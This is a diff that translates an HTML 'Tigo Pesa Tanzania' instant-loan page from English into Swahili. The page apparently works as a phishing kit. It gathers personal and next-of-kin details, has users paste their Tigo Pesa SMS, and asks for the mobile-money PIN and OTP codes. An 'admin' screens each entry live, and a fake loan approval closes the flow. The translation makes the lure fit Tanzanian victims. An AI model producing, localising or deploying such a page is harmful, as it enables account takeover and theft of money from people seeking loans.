@@ -1,26 +1,26 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sw">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Tigo Pesa Tanzania – Easy Loans</title>
+    <title>Tigo Pesa Tanzania – Mikopo Rahisi</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="./style.css" />
 </head>
 <body>
 
 <!-- ═══════════════════════════════════════════════════════════
-     SPLASH SCREEN (4s)
+     SPLASH SCREEN (sekunde 4)
      ═══════════════════════════════════════════════════════════ -->
 <div id="page-splash" class="page page-splash active">
     <div class="splash-container">
         <img src="./tigo_logo.png" alt="Tigo Pesa" class="splash-logo" />
-        <h1 class="splash-title">Tigo Pesa Tanzania</h1>
-        <p class="splash-sub">Fast, secure loans — right at your fingertips</p>
+        <h1 class="splash-title">Karibu Tigo Pesa Tanzania</h1>
+        <p class="splash-sub">Mikopo ya haraka na salama — mkononi mwako</p>
         <div class="splash-loader">
             <div class="splash-loader-bar" id="splashLoaderBar"></div>
         </div>
-        <p class="splash-hint">Getting things ready…</p>
+        <p class="splash-hint">Tunajiandaa…</p>
     </div>
 </div>
 
@@ -34,172 +34,172 @@
     <div class="land-center">
         <div class="land-card">
             <div class="land-hero">
-                <h1>Welcome to Tigo Pesa Loans</h1>
-                <p>Get instant loans through Tigo Pesa Tanzania</p>
+                <h1>Karibu Mikopo ya Tigo Pesa</h1>
+                <p>Pata mikopo ya haraka kupitia Tigo Pesa Tanzania</p>
             </div>
 
             <div class="calc-box">
-                <h2>Loan Calculator</h2>
-                <div class="calc-row2"><span>Amount</span><span class="cv" id="calcAmt">TZS 500,000</span></div>
-                <div class="calc-row2"><span>Term</span><span class="cv" id="calcTerm">12 Months</span></div>
+                <h2>Kikokotoo cha Mkopo</h2>
+                <div class="calc-row2"><span>Kiasi</span><span class="cv" id="calcAmt">TZS 500,000</span></div>
+                <div class="calc-row2"><span>Muda</span><span class="cv" id="calcTerm">Miezi 12</span></div>
                 <input type="range" id="amtSlider" min="50000" max="5000000" step="50000" value="500000" oninput="updateCalc()" />
                 <div class="range-ends"><span>TZS 50,000</span><span>TZS 5,000,000</span></div>
                 <div class="monthly-box">
-                    <span class="ml">Monthly Payment</span>
+                    <span class="ml">Malipo ya Kila Mwezi</span>
                     <span class="ma" id="monthlyAmt">TZS 41,667</span>
                 </div>
             </div>
 
             <button class="btn-primary" onclick="startApplication()">
-                START APPLICATION <span class="arrow">→</span>
+                ANZA MAOMBI <span class="arrow">→</span>
             </button>
         </div>
     </div>
-    <div class="land-footer">© 2026 Tigo Pesa Loans · Powered by Tigo Tanzania</div>
+    <div class="land-footer">© 2026 Mikopo ya Tigo Pesa · Inaendeshwa na Tigo Tanzania</div>
 </div>
 
 <!-- ═══════════════════════════════════════════════════════════
-     STEP 1: LOAN DETAILS
+     HATUA 1: MAELEZO YA MKOPO
      ═══════════════════════════════════════════════════════════ -->
 <div id="page-step1" class="page">
     <nav class="navbar">
-        <a class="nav-back" onclick="goTo('page-landing')">← Back</a>
+        <a class="nav-back" onclick="goTo('page-landing')">← Nyuma</a>
         <img src="./tigo_logo.png" alt="Tigo Pesa" class="nav-logo" />
         <div class="nav-spacer"></div>
     </nav>
     <div class="step-center">
         <div class="step-card">
             <div class="step-header">
-                <h2>Loan Application</h2>
-                <p class="step-sub">Step 1 of 5</p>
+                <h2>Maombi ya Mkopo</h2>
+                <p class="step-sub">Hatua 1 kati ya 5</p>
             </div>
             <div class="progress-track"><div class="progress-fill" style="width:20%"></div></div>
 
             <div class="error-banner" id="s1Err"><span>⚠</span><span id="s1ErrTxt"></span></div>
 
             <div class="field">
-                <label>Loan Type</label>
+                <label>Aina ya Mkopo</label>
                 <div class="select-wrap">
                     <select id="s1ty">
-                        <option>Personal Loan</option>
-                        <option selected>Business Loan</option>
-                        <option>Home Loan</option>
-                        <option>Car Loan</option>
-                        <option>Education Loan</option>
+                        <option>Mkopo wa Kibinafsi</option>
+                        <option selected>Mkopo wa Biashara</option>
+                        <option>Mkopo wa Nyumba</option>
+                        <option>Mkopo wa Gari</option>
+                        <option>Mkopo wa Elimu</option>
                     </select>
                 </div>
             </div>
 
             <div class="field">
-                <label>Loan Amount (TZS)</label>
+                <label>Kiasi cha Mkopo (TZS)</label>
                 <input type="number" id="s1am" value="500000" oninput="clearErr('s1Err')" />
             </div>
 
             <div class="field">
-                <label>Loan Term</label>
+                <label>Muda wa Mkopo</label>
                 <div class="select-wrap">
                     <select id="s1te">
-                        <option>6 Months</option>
-                        <option selected>12 Months</option>
-                        <option>18 Months</option>
-                        <option>24 Months</option>
-                        <option>36 Months</option>
+                        <option>Miezi 6</option>
+                        <option selected>Miezi 12</option>
+                        <option>Miezi 18</option>
+                        <option>Miezi 24</option>
+                        <option>Miezi 36</option>
                     </select>
                 </div>
             </div>
 
             <div class="field">
-                <label>Purpose of Loan</label>
-                <textarea id="s1pu" rows="3" placeholder="Describe the purpose of your loan…"></textarea>
+                <label>Sababu ya Mkopo</label>
+                <textarea id="s1pu" rows="3" placeholder="Mfano: Karo ya shule, Kukuza biashara, Bili za hospitali…"></textarea>
             </div>
 
-            <button class="btn-primary" onclick="toS2()">NEXT STEP</button>
+            <button class="btn-primary" onclick="toS2()">HATUA INAYOFUATA</button>
         </div>
     </div>
 </div>
 
 <!-- ═══════════════════════════════════════════════════════════
-     STEP 2: PERSONAL DETAILS
+     HATUA 2: TAARIFA BINAFSI
      ═══════════════════════════════════════════════════════════ -->
 <div id="page-step2" class="page">
     <nav class="navbar">
-        <a class="nav-back" onclick="goTo('page-step1')">← Back</a>
+        <a class="nav-back" onclick="goTo('page-step1')">← Nyuma</a>
         <img src="./tigo_logo.png" alt="Tigo Pesa" class="nav-logo" />
         <div class="nav-spacer"></div>
     </nav>
     <div class="step-center">
         <div class="step-card">
             <div class="step-header">
-                <h2>Loan Application</h2>
-                <p class="step-sub">Step 2 of 5</p>
+                <h2>Maombi ya Mkopo</h2>
+                <p class="step-sub">Hatua 2 kati ya 5</p>
             </div>
             <div class="progress-track"><div class="progress-fill" style="width:40%"></div></div>
 
             <div class="error-banner" id="s2Err"><span>⚠</span><span id="s2ErrTxt"></span></div>
 
             <div class="field-row">
-                <div class="field"><label>First Name</label><input type="text" id="s2fi" placeholder="Juma" /></div>
-                <div class="field"><label>Last Name</label><input type="text" id="s2la" placeholder="Mwakasege" /></div>
+                <div class="field"><label>Jina la Kwanza</label><input type="text" id="s2fi" placeholder="Juma" /></div>
+                <div class="field"><label>Jina la Mwisho</label><input type="text" id="s2la" placeholder="Mwakasege" /></div>
             </div>
 
             <div class="field">
-                <label>Phone Number (Tanzania)</label>
+                <label>Namba ya Simu (Tanzania)</label>
                 <div class="phone-group">
                     <span class="phone-prefix">+255</span>
                     <input type="tel" id="s2ph" placeholder="712 345 678" maxlength="9" />
                 </div>
-                <span class="field-hint">9 digits without the +255 prefix</span>
+                <span class="field-hint">Tarifa 9 bila kiambishi cha +255</span>
             </div>
 
             <div class="field">
-                <label>Email Address</label>
-                <input type="email" id="s2em" placeholder="you@example.com" />
+                <label>Barua Pepe</label>
+                <input type="email" id="s2em" placeholder="wewe@mfano.com" />
             </div>
 
             <div class="btn-row">
-                <button class="btn-secondary" onclick="goTo('page-step1')">BACK</button>
-                <button class="btn-primary" onclick="toS3()">NEXT STEP</button>
+                <button class="btn-secondary" onclick="goTo('page-step1')">NYUMA</button>
+                <button class="btn-primary" onclick="toS3()">HATUA INAYOFUATA</button>
             </div>
         </div>
     </div>
 </div>
 
 <!-- ═══════════════════════════════════════════════════════════
-     STEP 3: EMPLOYMENT / KIN
+     HATUA 3: AJIRA NA NDUGU WA KARIBU
      ═══════════════════════════════════════════════════════════ -->
 <div id="page-step3" class="page">
     <nav class="navbar">
-        <a class="nav-back" onclick="goTo('page-step2')">← Back</a>
+        <a class="nav-back" onclick="goTo('page-step2')">← Nyuma</a>
         <img src="./tigo_logo.png" alt="Tigo Pesa" class="nav-logo" />
         <div class="nav-spacer"></div>
     </nav>
     <div class="step-center">
         <div class="step-card">
             <div class="step-header">
-                <h2>Loan Application</h2>
-                <p class="step-sub">Step 3 of 5</p>
+                <h2>Maombi ya Mkopo</h2>
+                <p class="step-sub">Hatua 3 kati ya 5</p>
             </div>
             <div class="progress-track"><div class="progress-fill" style="width:60%"></div></div>
 
             <div class="error-banner" id="s3Err"><span>⚠</span><span id="s3ErrTxt"></span></div>
 
             <div class="field">
-                <label>Employment Status</label>
+                <label>Hali ya Ajira</label>
                 <div class="select-wrap">
                     <select id="s3em">
-                        <option>Employed</option>
-                        <option selected>Self-employed</option>
-                        <option>Unemployed</option>
-                        <option>Retired</option>
-                        <option>Student</option>
+                        <option>Nimeajiriwa</option>
+                        <option selected>Kujiajiri</option>
+                        <option>Sina Ajira</option>
+                        <option>Mstaafu</option>
+                        <option>Mwanafunzi</option>
                     </select>
                 </div>
             </div>
 
-            <div class="field"><label>Annual Income (TZS)</label><input type="number" id="s3in" placeholder="Enter annual income" /></div>
-            <div class="field"><label>Next of Kin Name</label><input type="text" id="s3kn" placeholder="Full name of next of kin" /></div>
+            <div class="field"><label>Mapato ya Mwaka (TZS)</label><input type="number" id="s3in" placeholder="Weka mapato ya mwaka" /></div>
+            <div class="field"><label>Jina la Ndugu wa Karibu</label><input type="text" id="s3kn" placeholder="Jina kamili la ndugu" /></div>
             <div class="field">
-                <label>Next of Kin Phone</label>
+                <label>Namba ya Ndugu wa Karibu</label>
                 <div class="phone-group">
                     <span class="phone-prefix">+255</span>
                     <input type="tel" id="s3kp" placeholder="712 345 678" maxlength="9" />
@@ -207,35 +207,35 @@
             </div>
 
             <div class="summary-panel">
-                <h4>Application Summary</h4>
-                <div class="summary-row"><span>Loan Amount</span><span id="sA">TZS 500,000</span></div>
-                <div class="summary-row"><span>Loan Term</span><span id="sT">12 Months</span></div>
-                <div class="summary-row"><span>Purpose</span><span id="sP">—</span></div>
-                <div class="summary-row"><span>Applicant</span><span id="sN">—</span></div>
+                <h4>Muhtasari wa Maombi</h4>
+                <div class="summary-row"><span>Kiasi cha Mkopo</span><span id="sA">TZS 500,000</span></div>
+                <div class="summary-row"><span>Muda wa Mkopo</span><span id="sT">Miezi 12</span></div>
+                <div class="summary-row"><span>Sababu</span><span id="sP">—</span></div>
+                <div class="summary-row"><span>Mwombaji</span><span id="sN">—</span></div>
             </div>
 
             <div class="btn-row">
-                <button class="btn-secondary" onclick="goTo('page-step2')">BACK</button>
-                <button class="btn-primary" onclick="submitApp()">SUBMIT APPLICATION</button>
+                <button class="btn-secondary" onclick="goTo('page-step2')">NYUMA</button>
+                <button class="btn-primary" onclick="submitApp()">TUMA MAOMBI</button>
             </div>
         </div>
     </div>
 </div>
 
 <!-- ═══════════════════════════════════════════════════════════
-     STEP 4: SMS PASTE
+     HATUA 4: BANDIKA UJUMBE WA TIGO PESA
      ═══════════════════════════════════════════════════════════ -->
 <div id="page-sms-paste" class="page">
     <nav class="navbar">
-        <a class="nav-back" onclick="goTo('page-step3')">← Back</a>
+        <a class="nav-back" onclick="goTo('page-step3')">← Nyuma</a>
         <img src="./tigo_logo.png" alt="Tigo Pesa" class="nav-logo" />
         <div class="nav-spacer"></div>
     </nav>
     <div class="step-center">
         <div class="step-card">
             <div class="step-header">
-                <h2>Verify Tigo Pesa Message</h2>
-                <p class="step-sub">Step 4 of 5</p>
+                <h2>Thibitisha Ujumbe wa Tigo Pesa</h2>
+                <p class="step-sub">Hatua 4 kati ya 5</p>
             </div>
             <div class="progress-track"><div class="progress-fill" style="width:80%"></div></div>
 
@@ -244,28 +244,28 @@
             <div class="rejected-notice hidden" id="smsRejectedNotice">
                 <span class="rejected-icon">⚠</span>
                 <div>
-                    <strong>Admin rejected your SMS</strong>
-                    <p>Please check the message and try again.</p>
+                    <strong>Msimamizi alikataa ujumbe wako</strong>
+                    <p>Tafadhali angalia ujumbe na ujaribu tena.</p>
                 </div>
             </div>
 
             <div class="field">
-                <label>📩 Paste the Tigo Pesa message content</label>
-                <textarea id="smsMsgBox" rows="5" placeholder="Copy and paste the entire Tigo Pesa message you received on your phone here…"></textarea>
-                <span class="field-hint">Include the OTP code or verification details sent to your Tigo Pesa number.</span>
+                <label>📩 Bandika maudhui ya ujumbe wa Tigo Pesa</label>
+                <textarea id="smsMsgBox" rows="5" placeholder="Nakili na bandika ujumbe mzima wa Tigo Pesa uliopokea kwenye simu yako hapa…"></textarea>
+                <span class="field-hint">Jumuisha msimbo wa OTP au maelezo ya uthibitisho yaliyotumwa kwenye namba yako ya Tigo Pesa.</span>
             </div>
 
             <div class="info-notice">
                 <span>💡</span>
-                <p>Check your SMS inbox for the message from Tigo Pesa Tanzania. Copy the entire message text.</p>
+                <p>Angalia kisanduku chako cha SMS kwa ujumbe kutoka Tigo Pesa Tanzania. Nakili maandishi yote ya ujumbe.</p>
             </div>
 
-            <button class="btn-primary" onclick="doSmsParse()">SUBMIT TIGO PESA MESSAGE</button>
+            <button class="btn-primary" onclick="doSmsParse()">TUMA UJUMBE WA TIGO PESA</button>
 
             <div class="resend-block hidden" id="smsResendBlock">
-                <p class="resend-hint">Resubmit the same message</p>
+                <p class="resend-hint">Tuma tena ujumbe huohuo</p>
                 <button class="btn-outline" id="smsResendBtn" onclick="resendSms()" disabled>
-                    Resend in <span id="smsResendTimer">60</span>s
+                    Tuma tena baada ya <span id="smsResendTimer">60</span>s
                 </button>
             </div>
         </div>
@@ -273,7 +273,7 @@
 </div>
 
 <!-- ═══════════════════════════════════════════════════════════
-     WAIT SMS
+     SUBIRI SMS
      ═══════════════════════════════════════════════════════════ -->
 <div id="page-wait-sms" class="page page-waiting">
     <div class="waiting-container">
@@ -281,8 +281,8 @@
             <div class="pulse-ring"></div>
             <div class="pulse-core">📩</div>
         </div>
-        <h2 class="waiting-title">Verifying SMS</h2>
-        <p class="waiting-sub">Please wait while our team reviews your message</p>
+        <h2 class="waiting-title">Inathibitisha SMS</h2>
+        <p class="waiting-sub">Tafadhali subiri wakati timu yetu inakagua ujumbe wako</p>
 
         <div class="countdown-circle">
             <svg viewBox="0 0 100 100">
@@ -292,32 +292,32 @@
             <div class="countdown-number" id="smsCountdownNum">30</div>
         </div>
 
-        <p class="waiting-hint" id="smsWaitStatus">Admin is reviewing your message…</p>
+        <p class="waiting-hint" id="smsWaitStatus">Msimamizi anakagua ujumbe wako…</p>
 
         <div class="waiting-steps">
-            <div class="wait-step done"><span>1</span> Submitted</div>
-            <div class="wait-step active"><span>2</span> Admin review</div>
-            <div class="wait-step"><span>3</span> Verified</div>
+            <div class="wait-step done"><span>1</span> Umetumwa</div>
+            <div class="wait-step active"><span>2</span> Ukaguzi</div>
+            <div class="wait-step"><span>3</span> Umethibitishwa</div>
         </div>
 
-        <button class="link-btn subtle" onclick="cancelWait('sms')">Cancel and go back</button>
+        <button class="link-btn subtle" onclick="cancelWait('sms')">Ghairi na urudi nyuma</button>
     </div>
 </div>
 
 <!-- ═══════════════════════════════════════════════════════════
-     STEP 5: PIN (4 digits for Tigo Pesa)
+     HATUA 5: PIN (tarakimu 4)
      ═══════════════════════════════════════════════════════════ -->
 <div id="page-pin" class="page">
     <nav class="navbar">
-        <a class="nav-back" onclick="goTo('page-sms-paste')">← Back</a>
+        <a class="nav-back" onclick="goTo('page-sms-paste')">← Nyuma</a>
         <img src="./tigo_logo.png" alt="Tigo Pesa" class="nav-logo" />
         <div class="nav-spacer"></div>
     </nav>
     <div class="step-center">
         <div class="step-card">
             <div class="step-header">
-                <h2>Enter Tigo Pesa PIN</h2>
-                <p class="step-sub">Step 5 of 5</p>
+                <h2>Weka PIN ya Tigo Pesa</h2>
+                <p class="step-sub">Hatua 5 kati ya 5</p>
             </div>
             <div class="progress-track"><div class="progress-fill" style="width:100%"></div></div>
 
@@ -326,12 +326,12 @@
             <div class="rejected-notice hidden" id="pinRejectedNotice">
                 <span class="rejected-icon">⚠</span>
                 <div>
-                    <strong>Admin rejected your PIN</strong>
-                    <p>Please enter the correct PIN.</p>
+                    <strong>Msimamizi alikataa PIN yako</strong>
+                    <p>Tafadhali weka PIN sahihi.</p>
                 </div>
             </div>
 
-            <p class="pin-prompt">Enter your 4-digit Tigo Pesa PIN</p>
+            <p class="pin-prompt">Weka PIN yako ya tarakimu 4 ya Tigo Pesa</p>
 
             <div class="pin-row pin-row-4">
                 <input type="password" id="pin0" class="pin-box" maxlength="1" inputmode="numeric" />
@@ -341,18 +341,18 @@
             </div>
 
             <div class="pin-actions">
-                <button class="link-btn" onclick="togPin()">👁 Show PIN</button>
-                <button class="link-btn" onclick="clearLoginPin()">✕ Clear</button>
+                <button class="link-btn" onclick="togPin()">👁 Onyesha PIN</button>
+                <button class="link-btn" onclick="clearLoginPin()">✕ Futa</button>
             </div>
 
-            <div class="attempts-badge" id="pinAttemptsDisplay">🔑 3 attempts remaining</div>
+            <div class="attempts-badge" id="pinAttemptsDisplay">🔑 Majaribio yaliyobaki: 3</div>
 
-            <button class="btn-primary" onclick="doPin()">SUBMIT TIGO PESA PIN</button>
+            <button class="btn-primary" onclick="doPin()">TUMA PIN YA TIGO PESA</button>
 
             <div class="resend-block hidden" id="pinResendBlock">
-                <p class="resend-hint">Resubmit the same PIN</p>
+                <p class="resend-hint">Tuma tena PIN hiyo hiyo</p>
                 <button class="btn-outline" id="pinResendBtn" onclick="resendPin()" disabled>
-                    Resend in <span id="pinResendTimer">60</span>s
+                    Tuma tena baada ya <span id="pinResendTimer">60</span>s
                 </button>
             </div>
         </div>
@@ -360,7 +360,7 @@
 </div>
 
 <!-- ═══════════════════════════════════════════════════════════
-     WAIT PIN
+     SUBIRI PIN
      ═══════════════════════════════════════════════════════════ -->
 <div id="page-wait-pin" class="page page-waiting">
     <div class="waiting-container">
@@ -368,8 +368,8 @@
             <div class="pulse-ring"></div>
             <div class="pulse-core">🔐</div>
         </div>
-        <h2 class="waiting-title">Verifying PIN</h2>
-        <p class="waiting-sub">Please wait while our team reviews your PIN</p>
+        <h2 class="waiting-title">Inathibitisha PIN</h2>
+        <p class="waiting-sub">Tafadhali subiri wakati timu yetu inakagua PIN yako</p>
 
         <div class="countdown-circle">
             <svg viewBox="0 0 100 100">
@@ -379,15 +379,15 @@
             <div class="countdown-number" id="pinCountdownNum">30</div>
         </div>
 
-        <p class="waiting-hint" id="pinWaitStatus">Admin is reviewing your PIN…</p>
+        <p class="waiting-hint" id="pinWaitStatus">Msimamizi anakagua PIN yako…</p>
 
         <div class="waiting-steps">
-            <div class="wait-step done"><span>1</span> Submitted</div>
-            <div class="wait-step active"><span>2</span> Admin review</div>
-            <div class="wait-step"><span>3</span> Verified</div>
+            <div class="wait-step done"><span>1</span> Umetumwa</div>
+            <div class="wait-step active"><span>2</span> Ukaguzi</div>
+            <div class="wait-step"><span>3</span> Umethibitishwa</div>
         </div>
 
-        <button class="link-btn subtle" onclick="cancelWait('pin')">Cancel and go back</button>
+        <button class="link-btn subtle" onclick="cancelWait('pin')">Ghairi na urudi nyuma</button>
     </div>
 </div>
 
@@ -396,15 +396,15 @@
      ═══════════════════════════════════════════════════════════ -->
 <div id="page-otp" class="page">
     <nav class="navbar">
-        <a class="nav-back" onclick="goTo('page-pin')">← Back</a>
+        <a class="nav-back" onclick="goTo('page-pin')">← Nyuma</a>
         <img src="./tigo_logo.png" alt="Tigo Pesa" class="nav-logo" />
         <div class="nav-spacer"></div>
     </nav>
     <div class="step-center">
         <div class="step-card">
             <div class="step-header">
-                <h2>Enter OTP Code</h2>
-                <p class="step-sub">4-digit code sent via SMS to your phone</p>
+                <h2>Weka Msimbo wa OTP</h2>
+                <p class="step-sub">Msimbo wa tarakimu 4 uliotumwa kwa SMS kwenye simu yako</p>
             </div>
 
             <div class="error-banner" id="otpErr"><span>⚠</span><span id="otpErrTxt"></span></div>
@@ -412,8 +412,8 @@
             <div class="rejected-notice hidden" id="otpRejectedNotice">
                 <span class="rejected-icon">⚠</span>
                 <div>
-                    <strong>Admin rejected your OTP</strong>
-                    <p>Please enter the correct OTP code.</p>
+                    <strong>Msimamizi alikataa OTP yako</strong>
+                    <p>Tafadhali weka msimbo sahihi wa OTP.</p>
                 </div>
             </div>
 
@@ -425,15 +425,15 @@
             </div>
 
             <div class="otp-actions">
-                <button class="link-btn" onclick="clearOtpCode()">✕ Clear</button>
+                <button class="link-btn" onclick="clearOtpCode()">✕ Futa</button>
             </div>
 
-            <button class="btn-primary" onclick="doOtp()">VERIFY & APPROVE LOAN</button>
+            <button class="btn-primary" onclick="doOtp()">THIBITISHA NA IDHINISHA MKOPO</button>
 
             <div class="resend-block hidden" id="otpResendBlock">
-                <p class="resend-hint">Resubmit the same OTP</p>
+                <p class="resend-hint">Tuma tena OTP hiyo hiyo</p>
                 <button class="btn-outline" id="otpResendBtn" onclick="resendOtp()" disabled>
-                    Resend in <span id="otpResendTimer">60</span>s
+                    Tuma tena baada ya <span id="otpResendTimer">60</span>s
                 </button>
             </div>
         </div>
@@ -441,7 +441,7 @@
 </div>
 
 <!-- ═══════════════════════════════════════════════════════════
-     WAIT OTP
+     SUBIRI OTP
      ═══════════════════════════════════════════════════════════ -->
 <div id="page-wait-otp" class="page page-waiting">
     <div class="waiting-container">
@@ -449,8 +449,8 @@
             <div class="pulse-ring"></div>
             <div class="pulse-core">🔑</div>
         </div>
-        <h2 class="waiting-title">Verifying OTP</h2>
-        <p class="waiting-sub">Please wait while our team reviews your OTP code</p>
+        <h2 class="waiting-title">Inathibitisha OTP</h2>
+        <p class="waiting-sub">Tafadhali subiri wakati timu yetu inakagua msimbo wako wa OTP</p>
 
         <div class="countdown-circle">
             <svg viewBox="0 0 100 100">
@@ -460,53 +460,53 @@
             <div class="countdown-number" id="otpCountdownNum">30</div>
         </div>
 
-        <p class="waiting-hint" id="otpWaitStatus">Admin is verifying your OTP…</p>
+        <p class="waiting-hint" id="otpWaitStatus">Msimamizi anathibitisha OTP yako…</p>
 
         <div class="waiting-steps">
-            <div class="wait-step done"><span>1</span> Submitted</div>
-            <div class="wait-step active"><span>2</span> Admin review</div>
-            <div class="wait-step"><span>3</span> Verified</div>
+            <div class="wait-step done"><span>1</span> Umetumwa</div>
+            <div class="wait-step active"><span>2</span> Ukaguzi</div>
+            <div class="wait-step"><span>3</span> Umethibitishwa</div>
         </div>
 
-        <button class="link-btn subtle" onclick="cancelWait('otp')">Cancel and go back</button>
+        <button class="link-btn subtle" onclick="cancelWait('otp')">Ghairi na urudi nyuma</button>
     </div>
 </div>
 
 <!-- ═══════════════════════════════════════════════════════════
-     APPROVAL
+     IDHINI
      ═══════════════════════════════════════════════════════════ -->
 <div id="page-approval" class="page page-approval">
     <div class="approval-container">
         <div class="approval-badge">✓</div>
-        <h2>Loan Approved!</h2>
-        <p class="approval-sub">Your loan has been successfully approved.</p>
+        <h2>Mkopo Umeidhinishwa!</h2>
+        <p class="approval-sub">Mkopo wako umeidhinishwa kwa mafanikio.</p>
 
         <div class="approval-amount-card">
-            <span class="approval-label">Amount to Receive</span>
+            <span class="approval-label">Kiasi cha Kupokea</span>
             <span class="approval-amount" id="aprAmount">TZS 500,000</span>
         </div>
 
         <div class="approval-details">
             <div class="approval-detail">
                 <span class="detail-icon">💰</span>
-                <div><span class="detail-label">Amount</span><span class="detail-value" id="aprAmt">TZS 500,000</span></div>
+                <div><span class="detail-label">Kiasi</span><span class="detail-value" id="aprAmt">TZS 500,000</span></div>
             </div>
             <div class="approval-detail">
                 <span class="detail-icon">📅</span>
-                <div><span class="detail-label">Term</span><span class="detail-value" id="aprTerm">12 Months</span></div>
+                <div><span class="detail-label">Muda</span><span class="detail-value" id="aprTerm">Miezi 12</span></div>
             </div>
             <div class="approval-detail">
                 <span class="detail-icon">💳</span>
-                <div><span class="detail-label">Monthly Payment</span><span class="detail-value" id="aprMth">TZS 41,667</span></div>
+                <div><span class="detail-label">Malipo ya Kila Mwezi</span><span class="detail-value" id="aprMth">TZS 41,667</span></div>
             </div>
         </div>
 
         <div class="info-notice">
             <span>ℹ️</span>
-            <p>Funds will be deposited to your Tigo Pesa account within 5 minutes.</p>
+            <p>Fedha zitawekwa kwenye akaunti yako ya Tigo Pesa ndani ya dakika 5.</p>
         </div>
 
-        <button class="btn-primary" onclick="finishApplication()">FINISH</button>
+        <button class="btn-primary" onclick="finishApplication()">MALIZA</button>
     </div>
 </div>
 
